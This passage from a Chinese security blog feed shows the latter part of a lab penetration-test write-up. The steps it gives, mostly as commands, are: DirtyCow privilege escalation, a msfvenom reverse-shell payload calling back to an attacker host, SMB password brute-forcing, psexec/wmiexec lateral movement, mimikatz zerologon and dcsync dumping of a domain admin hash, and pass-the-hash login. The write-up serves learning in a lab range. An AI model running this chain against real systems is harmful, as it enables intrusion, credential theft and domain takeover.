+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>linux 2.6.32 内核可以用&lt;a class="link" href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener"
+>脏牛(dirtycow)&lt;/a>提权，kali里有现成的利用脚本&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">searchsploit dirty cow
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco31cna0j313x0b3aiw.jpg"
+loading="lazy"
+alt="image-20260620173310231"
+>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">searchsploit dirty cow -m &lt;span class="m">40839&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco3159ltj313r0cdn1l.jpg"
+loading="lazy"
+alt="image-20260620173354348"
+>&lt;/p>
+&lt;p>然后用scp把脏牛脚本传到服务器上&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">scp -o &lt;span class="nv">HostKeyAlgorithms&lt;/span>&lt;span class="o">=&lt;/span>+ssh-rsa &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -o &lt;span class="nv">PubkeyAcceptedAlgorithms&lt;/span>&lt;span class="o">=&lt;/span>+ssh-rsa &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> 40839.c wwwuser@192.168.111.20:/home/wwwuser
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco30wwc2j312c08hgpq.jpg"
+loading="lazy"
+alt="image-20260620173734006"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco30pc6pj30s50kcwmb.jpg"
+loading="lazy"
+alt="image-20260620174055194"
+>&lt;/p>
+&lt;p>提权成功&lt;/p>
+&lt;h2 id="内网渗透">内网渗透
+&lt;/h2>&lt;p>接下来可以上线msf进行内网渗透了，生成一个木马，&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp &lt;span class="nv">lhost&lt;/span>&lt;span class="o">=&lt;/span>192.168.111.25 &lt;span class="nv">lport&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">32222&lt;/span> -f elf &amp;gt; payload.elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同样用scp上传&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco30i21tj312308c42n.jpg"
+loading="lazy"
+alt="image-20260620174651227"
+>&lt;/p>
+&lt;p>然后msf监听&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload linux/x64/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lhost 0.0.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lport &lt;span class="m">32222&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco30buy1j312b0d3dnc.jpg"
+loading="lazy"
+alt="image-20260620175648210"
+>运行木马&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2zsnhnj30iu030gmu.jpg"
+loading="lazy"
+alt="image-20260620174956674"
+>&lt;/p>
+&lt;p>回连&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco30buy1j312b0d3dnc.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>扫一下内网存活主机&lt;/p>
+&lt;p>先添加内网路由：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use post/multi/manage/autoroute
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> session &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco302u0tj31410k9dw7.jpg"
+loading="lazy"
+alt="image-20260620175350609"
+>&lt;/p>
+&lt;p>很多WP上都和上面一样用msf自带的udp模块来扫描，但我实操下来发现很不稳定，所以这里换成上传一个fscan来进行扫描&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2znf07j30p00ledm0.jpg"
+loading="lazy"
+alt="image-20260620200503721"
+>&lt;/p>
+&lt;p>可以看到探测到了&lt;code>192.168.93.10&lt;/code>,&lt;code>192.168.93.20&lt;/code>, &lt;code>192.168.93.30&lt;/code>三台主机&lt;/p>
+&lt;p>挨个扫一下&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2zdxsqj31ah0u97o8.jpg"
+loading="lazy"
+alt="image-20260620201323262"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2z3a7cj31af0n64df.jpg"
+loading="lazy"
+alt="image-20260620201442805"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2ysv0gj31ad0j47gg.jpg"
+loading="lazy"
+alt="image-20260620202031121"
+>&lt;/p>
+&lt;p>直接扫出来 &lt;code>192.168.93.10&lt;/code> 看起来像域控，&lt;code>192.168.93.20&lt;/code>是一台windows 2008，&lt;code>192.168.93.30&lt;/code>是一台win7&lt;/p>
+&lt;p>同时发现都开了445端口，使用的时候感觉fscan准确率不高，最好多扫几次&lt;/p>
+&lt;p>先尝试打一下win7的smb&lt;/p>
+&lt;p>配置socks代理：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/server/socks_proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> VERSION 4a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> SRVHOST 127.0.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> SRVPORT &lt;span class="m">1080&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run -j
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>爆破密码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains4 hydra -l administrator -P &lt;span class="s1">&amp;#39;/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt&amp;#39;&lt;/span> smb://192.168.93.30
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2yjgnkj31a90fywrm.jpg"
+loading="lazy"
+alt="image-20260620203558310"
+>&lt;/p>
+&lt;p>爆破到密码了&lt;/p>
+&lt;p>再爆破凭据&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/smb/smb_login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> smbuser administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> pass_file /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2yac2vj311x0e1nbe.jpg"
+loading="lazy"
+alt="image-20260620204435478"
+>&lt;/p>
+&lt;h2 id="横向">横向
+&lt;/h2>&lt;p>接下来利用smb横向&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/windows/smb/psexec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/bind_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> rhost 192.168.93.30
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> smbuser administrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> smbpass 123qwe!ASD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个发现不好拿shell，直接用wmiexec.py&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains python3 wmiexec-pro.py &lt;span class="s1">&amp;#39;Administrator:123qwe!ASD@192.168.93.30&amp;#39;&lt;/span> exec-command -shell
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2y1cwyj31af094tfk.jpg"
+loading="lazy"
+alt="image-20260620210108038"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2xudm0j30ib03cdgf.jpg"
+loading="lazy"
+alt="image-20260620210231214"
+>&lt;/p>
+&lt;p>已经是system了，但这里只能通过上传mimikatz的方式来steal token，先放一放，看看&lt;code>192.168.93.20&lt;/code>&lt;/p>
+&lt;p>发现可以用同样的密码登录&lt;code>192.168.93.20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2xfwq1j31060cen4y.jpg"
+loading="lazy"
+alt="image-20260620211417051"
+>&lt;/p>
+&lt;p>同样是system&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2wyjngj30tk0rbaj9.jpg"
+loading="lazy"
+alt="image-20260620214119657"
+>&lt;/p>
+&lt;p>所以域控ip是&lt;code>192.168.93.10&lt;/code>，域管理员用户名Administrator&lt;/p>
+&lt;p>然后可以开始横向到域控了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">load kiwi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kiwi_cmd sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kiwi_cmd lsadump::zerologon /target:WIN-8GA56TNV3MV.test.org /account:WIN-8GA56TNV3MV$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#攻击&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kiwi_cmd lsadump::zerologon /target:WIN-8GA56TNV3MV.test.org /account:WIN-8GA56TNV3MV$ /exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#攻击成功转出hash值&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kiwi_cmd lsadump::dcsync /domain:test.org /dc:WIN-8GA56TNV3MV.test.org /user:administrator /authuser:WIN-8GA56TNV3MV$ /authdomain:test /authpassword:&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> /authntlm
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2wr68gj30i406640p.jpg"
+loading="lazy"
+alt="image-20260620214511761"
+>&lt;/p>
+&lt;p>得到域控&lt;code>administrator&lt;/code>用户的ntlmhash 然后用wmiexec直接登录&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains uv run python wmiexec.py -hashes :18edd0cc3227be3bf61ce198835a1d97 Administrator@192.168.93.10
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco2x7ss8j310w0qoalh.jpg"
+loading="lazy"
+alt="image-20260620214002514"
+>&lt;/p>
+&lt;p>渗透结束。&lt;/p></description></item><item><title>红日靶场（一）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</link><pubDate>Mon, 15 Jun 2026 10:31:09 +0800</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场一渗透">红日靶场（一）渗透
 &lt;/h1>&lt;h2 id="第一章">第一章
 &lt;/h2>&lt;h3 id="渗透思路">渗透思路
 &lt;/h3>&lt;ol>
